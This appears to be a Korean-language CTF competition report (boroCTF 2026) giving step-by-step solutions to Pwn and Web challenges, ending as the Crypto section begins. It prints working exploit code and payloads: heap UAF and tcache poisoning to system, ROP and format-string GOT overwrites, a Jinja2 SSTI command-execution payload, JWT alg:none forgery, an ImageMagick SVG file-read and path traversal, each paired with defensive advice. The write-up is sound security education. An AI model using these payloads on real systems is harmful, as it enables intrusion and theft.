

![[Pasted image 20260625135833.png]]

# boroCTF 2026 — 문제 풀이 보고서 

> Team 4Leaf · Youngjin Kong · 98/115 Solved · 플래그 `boroCTF{...}`  

## 0. 방법론 (Methodology)

 CTF는 모의 시스템에서 비밀 문자열(플래그)을 획득하는 경진대회이며, 각 문제는 독립적인 "타겟"으로 간주해 다음 절차로 기술한다.

| 단계 | 내용 | 대응 |
|---|---|---|
| **개요** | 문제 설명·첨부파일·테마(말장난) 요약, 취약점 가설 | About / Objectives |
| **정찰** | 파일 식별(`file/exiftool/binwalk`), 포트/엔드포인트 스캔, 소스 확인 | Reconnaissance / Enumeration |
| **분석·공격** | 취약점 트리거, 익스플로잇/디코더 실행 — 실제 명령 기재 | Initial Access / Exploitation |
| **증적** | 획득한 플래그와 검증 근거 | Proof (local.txt / proof.txt) |

> 💡 **제출 게이트 (운영 규율).** 제출 직전 CTFd API `GET /api/v1/challenges/<id>`로 `max_attempts`를 확인하고, 결정론적 추출·독립 재현·서버 직접 출력 등 **검증된 근거가 있는 답만** 제출했다. 제한 문제는 첫 오답 시 즉시 중단했다.

> ⚠️ **증적에 관한 고지.** Pwn·Web·Crypto·Forensics·Rev는 실제 실행 명령과 PoC(`boroctf/` 폴더)를 그대로 수록했다. OSINT·Geosint는 터미널 로그가 남지 않는 분야라 **수행 단계 서술 + 실제 사용 도구/URL + 스크린샷**으로 기술했으며, 존재하지 않는 명령 로그를 지어내지 않았다.

## 1. Pwn — 바이너리 익스플로잇

메모리 손상으로 제어 흐름을 장악한다. 전 문제를 **원격 서비스 실제 익스플로잇 → 서버가 플래그 반환**으로 검증했다(자명한 proof). PoC: `boroctf/pwn/`, `boroctf/wave3/`, `boroctf/wave4/p19/`.

### Coming Together — Pwn · 100 pts

*취약점: **Integer Overflow** · 대상: **ELF64 PIE (not stripped)** · 원격: **nc oq7qaruz5vsw.boroctf.com 25287***

> **문제 설명(원문) (출제 Franklin)**: You have yours and I have mine. Together we have something larger than ourselves.

**개요**

정수 합산 검사를 우회해 flag 읽기 분기로 진입하는 문제로 추정.

**정찰**

`objdump`로 `main`을 분석한 결과, 입력 `n`에 대한 검사 로직이 다음과 같았다: **관찰** — `if(n>10000) n=1; if(n<0) n=-n; total=2+n; if(total<0) read_flag();`.

```text
# disassembly
# main 로직 요약 (objdump -d)
my = 2
n  = atoi(input)
if (n > 10000)  n = 1
if (n < 0)      n = -n      ; 부호 반전
total = 2 + n
if (total < 0)  read_flag() ; 음수면 승리
```

**분석·공격**

정상 입력으로는 `total`이 음수가 될 수 없다. 그러나 **`INT_MIN(-2147483648)`**을 넣으면 세 단계로 우회된다.

**① 음수라 `n>10000` 검사 통과** — 입력이 음수이므로 상한 검사에 걸리지 않는다.

```text
# 증적 ① — 소스 로직 (objdump -d)
if (n > 10000)  n = 1     ;  -2147483648 > 10000 → 거짓 → n 보존
```

**② 부호 반전 오버플로우 `-INT_MIN == INT_MIN`** — 32비트 signed에서 |INT_MIN|은 표현 불가라 부호반전이 항등이다.

```text
# 증적 ② — 소스 로직 + 2의 보수
if (n < 0)  n = -n        ;  -(0x80000000) = 0x80000000 = INT_MIN (그대로)
```

**③ `2 + INT_MIN < 0` 성립 → flag 분기** — 합이 음수가 되어 `read_flag()`가 트리거된다.

```text
# 증적 ③ — 소스 로직 + 익스플로잇 (pwn/coming_together_exploit.py)
total = 2 + n            ;  2 + (-2147483648) = -2147483646 < 0
if (total < 0) read_flag()
# --- 원격 익스플로잇 ---
io.recvuntil(b'contribute?'); io.sendline(b'-2147483648')
→ boroCTF{tw0s_c0mpl3men+_M3}   (원격 서버 stdout = 실행 증적)
```

> 💡 **원리·방어.** 2의 보수에서 `-INT_MIN`은 표현 불가라 그대로 `INT_MIN`이 된다. 방어: 부호 있는 정수 경계 검사, `INT_MIN` 특수처리, `-fsanitize=signed-integer-overflow`.

**FLAG:** `boroCTF{tw0s_c0mpl3men+_M3}`

### Next Challenge — Pwn · 100 pts

*취약점: **로직 함정** · 대상: **원격 전용(파일 없음)** · 원격: **nc thww9zyp6ygt.boroctf.com 19350***

**개요**

"Psst... special command called nc... that MAN has more answers." 순수 상호작용형 — 메뉴에서 숨은 명령을 찾는 문제.

**정찰·공격**

접속 후 메뉴에 `flag`를 입력하면 치즈/man 관련 함정 프롬프트가 막지만, **관찰** — `y`로 계속 진행하면 플래그가 출력된다.

```text
# interactive session
$ nc thww9zyp6ygt.boroctf.com 19350
> flag
... (cheese 프롬프트) 
> y
boroCTF{0nLinE_C@ts*}
```

**FLAG:** `boroCTF{0nLinE_C@ts*}`

### Mania — Pwn · 200 pts

*취약점: **UAF / tcache type confusion** · 대상: **Mania.zip (ELF64)** · 원격: **nc 0agn86asl3d2.boroctf.com 44996***

> **문제 설명(원문) (출제 Franklin)**: Poor Joe has been doing binary exploitation challenges for too long and has gone mad. Can you help him re-adapt to society and have a real conversation?

**개요**

힙 객체를 다루는 메뉴형 바이너리. free 후 재할당되는 동일 크기 청크를 노린다.

**정찰**

**관찰** — 두 객체의 메모리 레이아웃이 겹친다: `realPerson`는 off 64에 함수포인터 `conversate`를 두고, `imaginaryFriend`의 `special_ability` 필드(off 40~71)가 그 위치를 덮는다. 두 객체 크기가 같아(72B) tcache가 같은 청크를 재사용한다.

**분석·공격**

UAF로 freed 청크를 재획득해 함수포인터를 덮는 5단계 체인. `IDEAL = 0x401731`(`idealConversation` → `system("/bin/sh")`).

**① `meet`로 realPerson(RF) 할당**

```text
# 증적 ① — pwn/mania/exploit.py
io.sendlineafter(b'> ', b'3')                 # meet → RF 할당(conversate=정상함수)
io.sendlineafter(b'firstName:', b'A'); io.sendlineafter(b'lastName:', b'B')
```

**② `ghost`로 free하되 포인터 유지(UAF)**

```text
# 증적 ②
io.sendlineafter(b'> ', b'4')                 # ghost → free(RF), dangling 유지
```

**③ `imagine`로 같은 72B 청크 재획득(type confusion)**

```text
# 증적 ③
io.sendlineafter(b'> ', b'1')                 # imagine → 같은 청크 재사용
io.sendlineafter(b'title:', b'T')
```

**④ `special_ability`로 `conversate`(off 64)를 IDEAL로 덮어씀**

```text
# 증적 ④
payload = b'C'*24 + p64(IDEAL)[:3]            # 24패딩 + conversate 덮기
io.sendlineafter(b'special ability:', payload); io.sendlineafter(b'rating:', b'1.0')
```

**⑤ `interact` 호출 → 셸 → flag**

```text
# 증적 ⑤ — 원격 출력
io.sendlineafter(b'> ', b'5'); io.sendline(b'cat /app/flag.txt')
→ boroCTF{hYp0M&nic_3xplO1taTio4}   (원격 셸 stdout = 실행 증적)
```

> 💡 **방어.** free 후 포인터 NULL화, 객체별 격리 할당, CFI(함수포인터 무결성 검증).

**FLAG:** `boroCTF{hYp0M&nic_3xplO1taTio4}`

### New to the Format — Pwn · 200 pts

*취약점: **Format String → ROP** · 대상: **원격 역분석(파일 없음)** · 원격: **nc w56ll430yihy.boroctf.com 47845***

**개요**

바이너리 미제공. `printf(buf)` 포맷 스트링 취약점과 임의 1회 호출(`call [t]`)을 결합해 셸을 얻는다.

**정찰**

**관찰** — 원격은 ASLR OFF(PIE base `0x555555554000`, libc base `0x7ffff7d8b000`, glibc 2.35). `main`: `fgets(buf,128); printf(buf)`(FSB, 포맷인자 %8) 후 `scanf("%lx",&t); call [t]`. FSB `%N$s` 임의읽기로 원격 코드/스택을 덤프해 main을 복원했다.

**분석·공격**

ASLR OFF라 libc 가젯 주소가 고정. fgets 버퍼(고정주소)에 ROP를 적재하고 `call [t]`로 rsp를 피벗시킨다.

**① ROP 체인을 고정주소 fgets 버퍼에 적재**

```text
# 증적 ① — pwn/exploit_61.py
pop_rdi=LBASE+0x2a3e5; binsh=LBASE+0x1d8678; ret=LBASE+0x29139; system=LBASE+0x50d70
chain = p64(ret)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
io.sendline(chain)                  # fgets 버퍼에 적재(printf돼도 무해)
```

**② `call [t]`에 피벗 가젯 지정 → rsp를 버퍼로 **피벗****

```text
# 증적 ②
add_rsp_18=LBASE+0x3a889            # 'add rsp,0x18; ret' 피벗 가젯
io.sendlineafter(b'go?', b'%x'%add_rsp_18)   # scanf %lx → call rax = 피벗
```

**③ 피벗된 rsp가 체인 실행 → `system("/bin/sh")` → flag**

```text
# 증적 ③ — 원격 출력
io.sendline(b'cat /app/flag.txt')
→ boroCTF{%_0F_pEop!le}   (원격 셸 stdout)
```

> 💡 **방어.** `printf("%s", user)`로 포맷 분리, FORTIFY_SOURCE, ASLR/PIE 활성, 임의 call 타겟 제거.

**FLAG:** `boroCTF{%_0F_pEop!le}`

### Chicken Dinner — Pwn · 300 pts

*취약점: **Stack overflow (canary) + seccomp** · 기법: **canary 파이프라이닝 + ORW** · 원격: **nc gbdnqumsoif3.boroctf.com 11942***

> **문제 설명(원문) (출제 Franklin)**: I'm hosting a HUGE dinner party and everyone's invited! Though one condition ... I'm severely allergic to shellfish so no shells at the table. You better be good at using your utensils!

Flag Format: boroCTF{Looks_Good_Tastes_Bad}

**개요**

seccomp가 `execve`를 막으므로 셸 대신 **ORW(open-read-write)**로 flag를 읽는다.

**정찰**

```text
# seccomp / protections
# seccomp: syscall 59(execve)·322(execveat)만 KILL → ORW만 허용
# make_speech: read(0, buf[rbp-0x90], 0x400) → 스택 오버플로우
# 단, buf→canary offset 0x88 (canary 존재), no-PIE, NX
```

**분석·공격 — 총괄 진단(왜 안 풀렸나)**

**관찰** — canary 8바이트를 fork/getpid "seat 생존 오라클"로 브루트했으나, **서버 연결 수명 ~600초 < 브루트 필요시간**이라 매 연결 5~6바이트만 복구하고 EOF. 재연결 시 canary가 바뀌어 영원히 미완.

**해결** — **파이프라이닝**: 바이트 위치당 256개 후보를 응답 대기 없이 연속 전송하고 일괄 수신(TCP 순서보장) → 바이트당 ~128 RTT를 ~1 RTT로 압축.

```text
# pwn/dinner/ (brutefinal.log)
[+] b5=0x86 ... guesses=595 t=499      # 기존: 600초에 EOF
[+] FULL CANARY=0x1f7a17062623cd00 ng=467 SUCCESS   # 파이프라이닝: 467 guesses로 완전복구
# 이후 puts로 libc leak → ORW 체인
read(0,.bss,16)←"/app/flag.txt"; open; read(3,.data,0x20); write(1,.data,0x20)
```

**막판 버그** — ORW에서 `open` 반환 fd(rax)를 rdi로 옮기지 않고 `3`을 하드코딩 → read 0바이트. 적대적 검증으로 잡아 `xchg rdi,rax; ret` 가젯으로 실제 fd를 적재해 수정.

> 💡 **방어.** seccomp 화이트리스트 최소화(open 제한), fork마다 canary 재생성, 연결당 시도 제한, RELRO+PIE.

**FLAG:** `boroCTF{H0LY_Y0U_@R3_TH3_G04T}`

### Houston, we have a problem — Pwn · 300 pts

*취약점: **Format String → GOT overwrite** · 대상: **safe_satellite (i386, Partial RELRO, PIE)** · 원격: **nc zlcf0m425j5v.boroctf.com 31673***

> **문제 설명(원문) (출제 Franklin)**: Comrade, we intercept American telemetry link. They say it's old "weather" satillite, rubbish I tell you. The Americans trust their logging system too much. Make it "lose its way" if you know what me saying. Just little tip to friend, make sure you always keep your END in mind.

#Note - I would create a copy of the file so you don't have to keep downloading it... Which one? You'll figure it out!

**개요**

KH-1 / CORONA 위성 테마. `write_log()`가 사용자 입력을 FITS 텔레메트리 파일에 `fprintf(fptr, log)`로 기록 — 이 `log`이 곧 포맷 문자열(FSB). `print_logs()`가 그 카드를 `printf("%s")`로 되읽어줘 임의 읽기/쓰기가 모두 성립.

**정찰**

```text
# checksec safe_satellite
Arch: i386-32-little
RELRO: Partial RELRO     → GOT writable (쓰기 타겟)
Stack: Canary found      → 스택을 안 건드리므로 무관
NX: enabled / PIE: enabled → info leak 필요
```

**분석·공격**

**① PIE base leak** — `"%2$p"`의 2번째 vararg가 코드 포인터(`pie_base+0x3c4e`). Write log로 카드를 쓰고 Print logs로 되읽어 leak.

```text
# 증적 ① — wave4/p19/exploit.py
io.sendline(b"Write log"); io.sendline(b"LEAK====%2$p")   # FITS 키워드 위장(공백 금지)
base = leaked - 0x3c4e
```

**② GOT 덮어쓰기** — `strcspn@GOT`를 `emergency_orbit_realignment`로 덮는 `%n` 쓰기.

```text
# 증적 ②
payload = FMT_PAD + fmtstr_payload(7, {base+0x1781d4: base+0x3d91},
                                   numbwritten=5, write_size="short")
io.sendline(b"Write log"); io.sendline(payload)          # strcspn@GOT := emergency
```

**③ 트리거** — 루프가 `fgets` 직후 `strcspn(buf,"\r\n")` 호출, `buf`=스택주소=음수 int → `distance<=159` 분기 → flag.

```text
# 증적 ③ — 원격 출력
io.sendline(b"trigger")
→ boroCTF{wH@t_G0e3_uP_M8st_c0me_dOw4}
```

> ⚠️ **왜 fgets가 아니라 strcspn?** flag 읽기 분기는 fopen/fgets/printf만 쓰고 strcspn은 안 쓴다 → strcspn을 덮어야 재귀 없이 flag가 깔끔히 출력된다(fgets를 덮으면 flag 읽기 내부에서 재귀). ASLR로 base가 매 연결 랜덤이라 페이로드에 금지 바이트(공백/개행)가 끼면 자동 재접속.

**FLAG:** `boroCTF{wH@t_G0e3_uP_M8st_c0me_dOw4}`

### Jin Sakai — Pwn · Wave3

*취약점: **BOF(인접변수) + Integer Overflow** · 테마: **Ghost of Tsushima** · 대상: **boss (boss.c)** · 원격: **w4owkcjzvv0e.boroctf.com 53217***

> **문제 설명(원문) (출제 ForeverFlames)**: The Eagle's curse has completely made him go mad...

Once a hero of Tshushima, now a bloodthirsty warrior.

Please put an end to this madness.

**개요**

보스전 게임. 2단계 결함을 연쇄한다 — ① `gets()`로 인접 정수(체력)를 덮어 페이즈 전환, ② 데미지 계산의 정수 오버플로우로 승리.

**정찰**

**관찰(boss.c)** — `state.buffer[32]` 바로 뒤(offset 32)에 `int samurai_hp`가 인접. 입력은 `gets(state.buffer)`(길이 무제한). `samurai_hp<=0`이면 TRANSITION(페이즈2). 페이즈2의 "회복 물약" 분기는 `samurai_hp += amount`인데 `samurai_hp=INT_MAX` 상태.

**분석·공격**

**① Phase1 — BOF로 인접 `samurai_hp`를 음수로 덮어 페이즈 전환**

```text
# 증적 ① — wave3/p103/exploit.py
io.recvuntil(b"PROMPT|")              # 전투 함성 입력
io.sendline(b"A"*32 + p32(0xffffffff))  # buffer[32] 넘쳐 samurai_hp = -1 (<=0) → TRANSITION
```

**② Phase2 — 정수 오버플로우 `INT_MAX + 1 == INT_MIN`로 WIN 분기**

```text
# 증적 ② — 메뉴 조작 + 원격 출력
io.sendlineafter(b"PROMPT|", b"3")     # [3] Use Item
io.sendlineafter(b"PROMPT|", b"1")     # [1] Health Potion
io.sendlineafter(b"PROMPT|", b"2")     # target [2] The Beast
io.sendlineafter(b"PROMPT|", b"1")     # 1방울 → INT_MAX+1 == INT_MIN → WIN
→ boroCTF{gh0st_0f_3xpl01t4t10n}
```

> 💡 **방어.** `gets` 금지(`fgets`+길이), 인접 보안변수 배치 회피, 정수 경계 검사.

**FLAG:** `boroCTF{gh0st_0f_3xpl01t4t10n}`

### Two words, One problem — Pwn · Wave3

*취약점: **BOF로 인접 const 덮기** · 대상: **chal (two.c)** · 원격: **1xgu8bd1niap.boroctf.com 34069***

> **문제 설명(원문) (출제 Franklin)**: The first time pwn solves problems.

**개요·정찰**

**관찰(two.c)** — `change()`가 `gets(non_constant[37])`를 호출. 스택에서 `constant[37]`가 `non_constant`로부터 **48바이트 뒤**에 위치. `check()`는 `strcmp(constant,"boroCTF")==0`이면 flag 출력. 즉 비교 "정답"을 메모리로 통제 가능.

**분석·공격**

**① `non_constant` 오버플로우로 `constant`에 `"boroCTF\0"` 덮어쓰기**

```text
# 증적 ① — wave3/p55/exploit.py
io.sendlineafter(b"> ", b"2")                 # [2] Write → change() → gets()
io.sendline(b"X"*48 + b"boroCTF\x00")          # 48패딩 후 constant = "boroCTF"
```

**② Read 메뉴로 `check()` 트리거 → `strcmp==0` → flag**

```text
# 증적 ② — 원격 출력
io.sendlineafter(b"> ", b"1")                 # [1] Read → check() → strcmp(constant,"boroCTF")==0
→ boroCTF{I_c@n_7ix_tH%s}
```

> 💡 **방어.** `gets` 제거, 변수 메모리 레이아웃에 의존한 비교 금지, 비교 기준값은 읽기전용(`.rodata`).

**FLAG:** `boroCTF{I_c@n_7ix_tH%s}`

### Sailing the Seven Seas — Pwn · Wave3

*취약점: **UAF → leak + tcache poison → __free_hook** · 대상: **fleet (sail.c), glibc 2.31** · 원격: **2vl7azdr4vhf.boroctf.com 28267***

> **문제 설명(원문) (출제 Franklin)**: Sinbad are you sure about this? What kind of fleet would be able to transverse to the eighth sea?

**개요**

`free()`가 포인터를 NULL화하지 않아 UAF(inspect=freed 읽기, adjust=freed 쓰기). glibc 2.31이라 tcache next가 mangle되지 않음 → 3단계로 셸.

**정찰**

**관찰** — `malloc(136)`→0x90 청크. tcache(0x90)를 7개 채우고 8번째를 free하면 unsorted bin으로 가 `main_arena` 포인터가 fd에 남는다(libc leak 경로).

**분석·공격 — 3단계**

**① libc leak** — 9개 할당 후 8개 free(7개 tcache, 8번째 unsorted) → inspect로 fd 읽어 `main_arena` 역산.

```text
# 증적 ① — wave3/p60/exploit.py
for i in range(9): alloc(i)            # 0..8 (8은 top 병합 방지 가드)
for i in range(8): free(i)             # 0..6 tcache, 7 → unsorted bin
fd = u64(inspect(7)[:6]...)            # main_arena+96 leak → libc.address 계산
```

**② tcache poison** — chunk.next를 `__free_hook`으로 덮어 2회 malloc 후 `__free_hook` 획득 → `system` 기록.

```text
# 증적 ②
edit(8, p64(libc.sym['__free_hook']))  # tcache: chunk8 → __free_hook
alloc(0); alloc(1)                      # 두 번째 malloc이 __free_hook 반환
edit(1, p64(libc.sym['system']))        # __free_hook := system
```

**③ trigger** — 청크에 셸 명령을 넣고 free → `system(cmd)`.

```text
# 증적 ③ — 원격 출력
edit(0, b"cat fl* /*flag* #\x00"); free(0)   # free → system(cmd)
→ boroCTF{Sp1a5h#_w!th_Tcache3}
```

> 💡 **방어.** free 후 NULL화, 최신 glibc(__free_hook 제거·tcache key·safe-linking), 격리 할당.

**FLAG:** `boroCTF{Sp1a5h#_w!th_Tcache3}`

### Free Challenge — Pwn · Wave3

*취약점: **UAF + realloc(tcache key) → tcache_perthread 오염** · 대상: **filer (chal.c), glibc 2.31, No PIE** · 원격: **k7Xm2pQw9R.boroctf.com 62831***

> **문제 설명(원문) (출제 nulled)**: This challenge is pretty free!

Do not trust him - Franklin

**개요**

`report_t {char title[8]; char* file_data; uint32_t size}`(0x20 청크). `target@0x404090`에 flag 힙 포인터가 저장됨. `close_report`가 free 후 NULL화 안 함(UAF).

**정찰 — 핵심 프리미티브**

**관찰** — free 후 `report+8`(file_data)에는 tcache `key`(=`&tcache_perthread_struct`)가 남는다. `edit_report`는 `realloc(report->file_data /*=key*/, size)`를 하는데, 작은 size면 **같은 포인터를 반환** → 이후 `fgets`가 **tcache_perthread_struct에 직접 기록** → counts[]/entries[] 위조(2.31 tcache_get은 검증 없음).

**분석·공격 — 2 페이즈**

**① Phase1 (flag 포인터 H 누출)** — `entries[0]=&target.file_data(0x404098)`로 tcache 위조 → `make_report`의 malloc(0x18)이 0x404098 반환 → `title`(`%s`)이 flag 힙 포인터 H 출력 → heapbase 계산.

```text
# 증적 ① — wave3/p110/exploit.py
make(b"A",0x90,b"data"); close()           # free → dangling, report+8 = tcache key
edit(b"B", 0x108, tcache_struct({0:(1, 0x404098)}, ...))   # realloc(key)→fgets가 tcache 구조체에 기록
menu(1)  # malloc(0x18)=0x404098 → title=%s = flag ptr H 누출 → heapbase=H-0x480
```

**② Phase2 (flag 읽기)** — report_t 청크와 데이터 버퍼가 같은 주소 P를 가리키도록 overlap 위조 → 데이터 `fgets`로 `report->file_data = H` 세팅 → `read_report`의 `puts(file_data)`가 flag 출력.

```text
# 증적 ② — 원격 출력
make(b"C",0x48,b"d"); close()
edit(b"D", 0x108, tcache_struct({0:(1,P), 3:(1,P)}, ...))   # report_t와 data가 P에서 overlap
menu(1); ...; io.send(b"AAAAAAAA"+p64(H))   # report->file_data := H
menu(2)   # read_report → puts(H) = FLAG
→ boroCTF{free_yourself_into_tcache}
```

> 💡 **원리·방어.** tcache `key`를 realloc 대상으로 쓰면 tcache 메타데이터를 직접 덮을 수 있다. 방어: free 후 NULL화, 최신 glibc(tcache 검증·safe-linking), realloc 인자 검증.

**FLAG:** `boroCTF{free_yourself_into_tcache}`

## 2. Web — 웹 취약점

모든 문제는 `https://<rand>.boroctf.com/` 격리 인스턴스. 공통 원칙: **인가(authorization)는 항상 서버에서** — 클라이언트가 숨긴 것은 안전하지 않다. PoC: `boroctf/jwt.py`, `boroctf/klaud.py`, `boroctf/exploit.py`.

### Beyond the Homepage — Web · 100 pts

*취약점: **Source Disclosure (HTML 주석)***

**개요**

화면에 보이지 않는 정보가 응답 본문에 남아있는지 점검.

**정찰·공격**

**관찰** — 브라우저 렌더링이 아니라 원본 HTML을 받아 grep하면 주석에 플래그가 노출된다.

```text
# curl
$ curl -s https://...boroctf.com/ | grep -i boroctf
<!--boroCTF{d3v3l0peR_t001s}-->
```

> 💡 **방어.** 빌드 시 주석/디버그 흔적 strip, 비밀은 서버에만.

**FLAG:** `boroCTF{d3v3l0peR_t001s}`

### boro-senpai 1 — Web · IDOR

*취약점: **IDOR (Insecure Direct Object Reference)** · 테마: **Steins;Gate***

**개요·정찰**

프로필에 "본인만 볼 수 있다"는 비밀 필드 존재. 이는 클라이언트 가정일 뿐 — 서버가 인가를 검사하지 않으면 다른 사용자명으로 직접 접근 가능. 작중 인물 Kurisu의 핸들 `KuriGohanandKamehameha`를 식별.

**공격**

```text
# curl
$ curl -s .../profile/KuriGohanandKamehameha | grep flag-value
boroCTF{3l_psY_c0ngR00!}
```

> 💡 **방어.** 객체 접근마다 서버 측 소유권/권한 검증, 비밀 필드는 본인 세션에서만 직렬화.

**FLAG:** `boroCTF{3l_psY_c0ngR00!}`

### Kobeni's Dashboard — Web · ImageMagick LFI

*취약점: **ImageMagick LFI (pseudo-coder)** · 단서: **X-Processor: ImageMagick***

**개요·정찰**

**관찰** — 업로드 응답 헤더 `X-Processor: ImageMagick`. ImageMagick은 SVG 렌더 시 `text:/caption:/label:` 등 pseudo-protocol coder를 해석 → 로컬 파일을 이미지로 렌더해 반환(LFI, "ImageTragick" 계열).

**분석·공격**

**① SVG에 pseudo-coder로 LFI 트리거** — `caption:@/flag.txt`를 참조하는 SVG를 업로드하면 서버가 flag 파일을 텍스트로 렌더한 PNG를 반환.

```text
# 증적 ① — SVG payload + curl
<!-- cap.svg -->
<image xlink:href="caption:@/flag.txt"/>     # 파일을 텍스트로 렌더
$ curl -F "file=@cap.svg;type=image/svg+xml" .../upload
data:image/png;base64,...  (렌더된 이미지에 flag 텍스트)
```

**② 판독 — `text:`→`caption:` 코더 교체로 고해상도 재렌더** — 처음 `text:`는 ~15px라 오독(4회 오답). `caption:`으로 박스를 꽉 채워 124px로 재렌더하니 아포스트로피·마지막 대문자 `E`까지 선명.

```text
# 증적 ② — 판독 교훈
<image xlink:href="caption:@/flag.txt" width="900"/>   # 박스 채움 → 글자 확대
```

> 💡 **방어.** `policy.xml`에서 `text/label/caption/url/msl/https` 코더 `rights="none"`, 업로드 매직바이트 검증, SVG sanitize.

**FLAG:** `boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}`

### boro-senpai 2 — Web · SSRF

*취약점: **SSRF (블랙리스트 우회)***

**개요·정찰**

`POST /api/pulse {"url":...}`가 서버 측에서 그 URL로 대신 요청(SSRF). **관찰** — IP 리터럴(`127.0.0.1`)은 차단되나 **내부 DNS 호스트명은 블랙리스트 누락**.

**공격**

```text
# curl
$ curl -X POST .../api/pulse -d '{"url":"http://internal-api/flag"}'
{"flag":"boroCTF{w1sh_w3_c0uld_g0_2_th3_m00n_t0g3th3r}"}
```

> 💡 **방어.** 블랙리스트가 아닌 화이트리스트(허용 도메인만), DNS 리바인딩 방지, 내부 응답 비반환, 169.254.169.254 차단.

**FLAG:** `boroCTF{w1sh_w3_c0uld_g0_2_th3_m00n_t0g3th3r}`

### boro-senpai 3 — Web · Broken Access Control

*취약점: **soft-delete 인가 누락***

**개요·정찰**

"인터넷은 실제로 삭제하지 않는다." `main.js`에 삭제 레코드 조회용 모더레이터 함수와 비밀 파라미터 `include_deleted=true`가 노출. 서버가 이 파라미터의 인가를 검사하지 않음.

**공격**

```text
# curl
$ curl ".../api/user/mai-sakurajima?include_deleted=true"
{"status":"deleted", ... "mod_notes":"...boroCTF{th@nk_y0u...<3}"}
```

> 💡 **방어.** 민감 레코드 hard-delete/격리, 권한 검사는 서버 측, 모더레이터 식별자 비노출.

**FLAG:** `boroCTF{th@nk_y0u_y0u_d!d_w3ll_!_l0v3_y0U<3}`

### Jay W Tee — Web · JWT

*취약점: **JWT alg:none 위조** · PoC: **jwt.py***

**개요·정찰**

JWT 기반 인증. **관찰** — 서버가 토큰 헤더의 `alg`에 검증을 위임 → `alg:none`+빈 서명을 "서명 불필요"로 수용.

**공격**

```text
# jwt.py
def jwt(payload, alg="none", sig=""):
    h=b64({"alg":alg,"typ":"JWT"}); p=b64(payload); return f"{h}.{p}.{sig}"
forged = jwt({"user":"Karl","role":"admin","admin":True}, "none", "")
req("/api/billing/status", forged)     # 서명검증 생략 → 200 + flag
→ boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}
```

> 💡 **방어.** 허용 알고리즘 allowlist 고정, `none`·키 혼동(RS256→HS256) 거부.

**FLAG:** `boroCTF{n0_s1gn4tur3_n0_pr0bl3m^^}`

### Klaud Code — Web · 로직 결함

*취약점: **쿠폰 대소문자 불일치** · PoC: **exploit.py / klaud.py***

**개요·정찰**

**관찰** — 쿠폰 처리에서 *유효성 검증*은 대소문자 무시(같은 코드 인정)하지만 *중복 사용 체크*는 대소문자 구분(다른 케이싱=다른 코드로 오인).

**공격**

같은 코드 `KLAUD20OFF`를 여러 케이싱으로 중첩 적용해 할인을 100%까지 쌓아 결제를 0으로 만든다.

```text
# exploit.py
for c in ["KLAUD20OFF","klaud20off","Klaud20Off","kLAUD20off","KLAUD20off"]:
    post("/api/cart/coupon", {"code": c})   # 매번 신규로 인정 → 할인 스택
post("/api/checkout", {})                   # total = 0 → flag
→ boroCTF{kl@ud_c0d3d_btw_lol}
```

> 💡 **방어.** 정규화(소문자) 후 단일 키로 검증·중복체크 일관 적용.

**FLAG:** `boroCTF{kl@ud_c0d3d_btw_lol}`

### Cracking the Vault — Web · Wave3

*취약점: **클라이언트 측 평문 비밀번호***

**개요·공격**

인증 로직이 클라이언트 JS에 평문 비밀번호를 하드코딩해 비교 → DevTools/소스만 보면 비번 노출.

> 💡 **방어.** 검증은 서버에서, 비밀은 클라이언트로 내려보내지 않는다.

**FLAG:** `boroCTF{th3_p@th_l3ss_tr@vers3d}`

### dotdotslashflagtxt — Web · Wave3

*취약점: **Path Traversal***

**개요·공격**

파일 조회 파라미터에 `../../flag.txt`를 넣어 의도된 디렉터리를 벗어나 임의 파일을 읽는다.

```text
# curl
$ curl ".../download?file=../../flag.txt"
boroCTF{p@th_Tr@v3rs@L_r0Ck5!}
```

> 💡 **방어.** 경로 정규화(canonical) 후 화이트리스트 비교, `..` 단순 제거는 우회됨.

**FLAG:** `boroCTF{p@th_Tr@v3rs@L_r0Ck5!}`

### Drone Dash — Web · Wave3

*취약점: **Prototype Pollution***

**개요·공격**

JSON을 재귀 병합하는 서버가 `__proto__` 키(또는 빈/조작 JSON)로 전역 기본값을 오염시켜 검증을 무력화하고 승리 상태(`win=true`)를 주입한다.

> 💡 **방어.** `__proto__`/`constructor` 키 차단, `Object.create(null)`, 스키마 검증.

**FLAG:** `boroCTF{pr0totyp3_p0llut10n_dr0ne_d4sh}`

### NERV — Web · Wave3 · SSTI

*취약점: **Jinja2 SSTI** · 테마: **Evangelion***

**분석·공격**

**① 정찰 — `robots.txt`에서 숨은 `/admin/reports` 노출**

```text
# 증적 ① — robots.txt
$ curl .../robots.txt   →  Disallow: /admin/reports
```

**② SSTI 평가 확인 후 객체 체인으로 RCE → flag** — 폼 입력이 Jinja2 템플릿에서 평가됨.

```text
# 증적 ② — SSTI probe
POST /admin/reports  name={{7*7}}        # → 49 (평가 확인)
name={{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
→ boroCTF{c0ngr@tulat!0nS*}
```

> 💡 **방어.** 사용자 입력을 템플릿으로 렌더하지 말 것(샌드박스·자동 이스케이프).

**FLAG:** `boroCTF{c0ngr@tulat!0nS*}`

### boroGPT — Web · Wave3

*취약점: **소스맵 누출 → SSTI***

**분석·공격**

**① 소스맵(.map) 누출로 숨은 동작 발견** — 배포된 클라이언트 번들의 `.map`이 디버그 경로/헤더를 노출.

```text
# 증적 ① — 소스맵
$ curl .../app.js.map | grep -i dev   # X-Dev-Mode / /api/v0 단서
```

**② 비밀 헤더 `X-Dev-Mode`로 `/api/v0` 디버그 엔드포인트 활성화**

```text
# 증적 ②
$ curl -H "X-Dev-Mode: 1" .../api/v0/...   # 디버그 라우트 개방
```

**③ `/api/v0`의 SSTI로 flag** — 디버그 엔드포인트 입력이 템플릿에서 평가됨.

```text
# 증적 ③
{{ ...globals....popen('cat flag').read() }}
→ boroCTF{pub1ic_k3y_g0es_both_ways}
```

> 💡 **방어.** 프로덕션 소스맵 비배포, 디버그 헤더/엔드포인트 제거.

**FLAG:** `boroCTF{pub1ic_k3y_g0es_both_ways}`

## 3. Crypto — 암호

핵심 원칙: **인코딩은 기밀성 통제가 아니다**. 문자셋·바이트 분포 분석으로 종류를 특정해 가역 복호한다. 300점대는 실제 암호 결함(ECDSA nonce 재사용 등) 역설계. PoC: `boroctf/crypto/dec_basic.py`, `crypto/babel.py`.

### A basic start — Crypto · basE91

*취약점: **약한 인코딩 식별** · PoC: **crypto/dec_basic.py***

